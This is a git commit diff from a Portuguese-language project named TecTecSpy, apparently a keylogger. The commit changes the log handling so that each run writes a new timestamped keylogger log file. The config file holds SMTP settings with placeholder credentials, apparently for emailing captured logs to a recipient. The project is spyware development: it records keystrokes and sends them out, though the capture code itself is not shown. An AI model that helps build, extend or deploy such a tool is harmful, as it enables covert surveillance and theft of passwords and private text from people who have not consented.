1bfe9943d7fc61ff3363eeeeedaaa233454c234f
Huotes <aureliodosol@gmail.com>
2024-10-02 22:57:02 -0300

    feat(logs): Agora são gerados varios logs ao inves de apenas manipular um único

--- main.py
+++ main.py
@@ -1,19 +1,19 @@
 from tecspy.keylogger import KeyLogger
 from tecspy.logger import Logger
-from tecspy.config import LOG_FILE_PATH
+from tecspy.config import get_log_file_path
 from tecspy.utils import create_log_directory
 import os
 
-# Defina o diretório de logs e screenshots de forma relativa
-project_root = os.path.dirname(os.path.abspath(__file__))  # Diretório do projeto
-log_directory = os.path.join(project_root, 'logs')
+# Defina o diretório de logs na raiz do projeto
+log_directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
 
+# Cria o diretório de logs, se não existir
 create_log_directory(log_directory)
 
-# Atualiza o caminho do arquivo de log para ser relativo
-LOG_FILE_PATH = os.path.join(log_directory, 'keylogger.log')
+# Gera o caminho do arquivo de log baseado na data e hora atuais
+LOG_FILE_PATH = get_log_file_path()
 
-# Inicializa o logger
+# Inicializa o logger com o arquivo de log recém-criado
 logger = Logger(LOG_FILE_PATH)
 
 # Inicializa o keylogger
--- tecspy/config.py
+++ tecspy/config.py
@@ -1,8 +1,26 @@
-import os
+"""
+Este módulo contém as configurações do projeto TecTecSpy.
 
-# Diretório de logs será definido de forma relativa
+Ele define o caminho do arquivo de log e as configurações de e-mail
+necessárias para o envio de logs.
+"""
+
+import os
+from datetime import datetime
+
+# Diretório de logs
 project_root = os.path.dirname(os.path.abspath(__file__))
-LOG_FILE_PATH = os.path.join(project_root, 'logs', 'keylogger.log')
+log_directory = os.path.join(project_root, 'logs')
+
+# Função para gerar o caminho do log com base na data e hora atuais
+def get_log_file_path():
+    # Diretório de logs na raiz do projeto
+    project_root = os.path.dirname(os.path.abspath(__file__))
+    log_directory = os.path.join(project_root, '..', 'logs')  # Caminho correto para a raiz
+
+    # Cria o nome do arquivo de log com base na data e hora atuais
+    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    return os.path.join(log_directory, f'keylogger_{current_time}.log')
 
 # Configurações de email
 SMTP_SERVER = "smtp.example.com"
@@ -10,3 +28,4 @@ SMTP_PORT = 587
 SMTP_USERNAME = "your_email@example.com"
 SMTP_PASSWORD = "your_password"
 RECIPIENT_EMAIL = "recipient@example.com"
+
